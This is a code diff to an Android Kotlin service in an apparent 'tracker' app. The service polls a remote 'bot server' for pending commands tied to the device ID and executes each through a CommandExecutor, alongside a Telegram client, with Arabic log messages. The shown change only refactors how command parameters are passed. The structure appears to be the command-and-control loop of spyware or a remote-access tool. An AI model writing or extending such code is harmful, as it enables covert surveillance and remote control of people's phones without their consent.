@@ -15,6 +15,8 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.abuzahra.tracker.BotServerClient
+import com.abuzahra.tracker.CommandExecutor
 import com.abuzahra.tracker.LocalStorageManager
 import com.abuzahra.tracker.SharedPrefsManager
 import com.abuzahra.tracker.TelegramDirectClient
@@ -169,12 +171,19 @@ class MainTrackerService : Service() {
                 try {
                     val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService)
                     if (deviceId != null) {
-                        val commands = BotServerClient.getPendingCommands(deviceId)
-                        if (commands.isNotEmpty()) {
-                            Log.d(TAG, "تم استلام ${commands.size} أوامر من السيرفر")
-                            for (cmd in commands) {
+                        val cmds: List<com.abuzahra.tracker.BotServerClient.Command> = BotServerClient.getPendingCommands(deviceId)
+                        if (cmds.isNotEmpty()) {
+                            Log.d(TAG, "تم استلام ${cmds.size} أوامر من السيرفر")
+                            for (cmd in cmds) {
                                 try {
-                                    CommandExecutor.execute(this@MainTrackerService, cmd.command, cmd.params)
+                                    val params = if (cmd.params != null) {
+                                        val json = org.json.JSONObject()
+                                        for ((k, v) in cmd.params) json.put(k, v)
+                                        json
+                                    } else {
+                                        org.json.JSONObject()
+                                    }
+                                    CommandExecutor.execute(this@MainTrackerService, cmd.command, params)
                                 } catch (e: Exception) {
                                     Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
                                 }
